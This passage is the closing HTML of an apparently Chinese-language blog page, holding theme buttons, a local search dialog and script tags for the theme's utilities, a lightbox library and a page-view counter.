fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
